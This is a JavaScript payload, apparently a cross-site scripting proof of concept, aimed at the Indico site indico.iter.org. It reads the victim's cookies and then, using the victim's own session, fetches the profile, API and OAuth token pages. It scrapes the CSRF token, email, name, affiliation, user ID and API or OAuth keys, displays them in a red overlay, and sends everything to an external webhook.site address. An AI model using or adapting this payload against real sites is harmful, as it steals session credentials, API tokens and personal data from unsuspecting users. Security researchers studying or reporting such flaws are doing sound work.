(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;
  var evidence = { cookies: cookies };

  fetch('https://indico.iter.org/user/profile/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      evidence.csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      evidence.email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/)
        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
      evidence.first_name = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);
      evidence.last_name = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);
      evidence.affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);
      evidence.user_id = g(/data-user-id="(\d+)"/);

      if (!evidence.csrf) {
        evidence.step = 'profile_failed';
        report(evidence);
        return;
      }

      evidence.step = 'profile_read';
      report(evidence);

      return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
        .then(function (r) { return r.text(); })
        .then(function (apiHtml) {
          var bodyStart = apiHtml.indexOf('<body');
          var bodyContent = bodyStart > -1 ? apiHtml.substring(bodyStart) : apiHtml;

          var keyMatch = bodyContent.match(/<code[^>]*>([a-f0-9]{20,})<\/code>/)
            || bodyContent.match(/api.?key[^<]{0,100}?([a-f0-9]{32,})/)
            || bodyContent.match(/token[^<]{0,60}?([a-f0-9]{32,})/i);

          var hasCreate = /Create API key|key_create|create_key/i.test(bodyContent);
          var hasDeprecated = /deprecated|oauth|personal.token/i.test(bodyContent);

          evidence.step = 'api_page';
          evidence.api_key = keyMatch ? keyMatch[1] : null;
          evidence.has_create = hasCreate;
          evidence.api_deprecated = hasDeprecated;
          evidence.api_body = bodyContent.substring(0, 5000);
          report(evidence);

          if (evidence.api_key) return;

          return fetch('https://indico.iter.org/oauth/user/tokens/', { credentials: 'include' })
            .then(function (r) { return r.text(); })
            .then(function (tokenHtml) {
              var tBody = tokenHtml.indexOf('<body');
              var tContent = tBody > -1 ? tokenHtml.substring(tBody) : tokenHtml;

              var tokenMatch = tContent.match(/token[^<]{0,80}?([a-zA-Z0-9_-]{20,})/)
                || tContent.match(/<code[^>]*>([a-zA-Z0-9_-]{20,})<\/code>/);

              evidence.step = 'oauth_tokens';
              evidence.oauth_token = tokenMatch ? tokenMatch[1] : null;
              evidence.token_body = tContent.substring(0, 5000);
              report(evidence);
            });
        });
    })
    .catch(function (err) {
      evidence.step = 'error';
      evidence.error = err.message;
      report(evidence);
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'Step: ' + (ev.step || '?') + '\n'
      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
      + 'Email: ' + (ev.email || 'n/a') + '\n'
      + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
      + 'Affiliation: ' + (ev.affiliation || 'n/a') + '\n'
      + 'API Key: ' + (ev.api_key || ev.oauth_token || 'n/a') + '\n'
      + 'User ID: ' + (ev.user_id || 'n/a');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
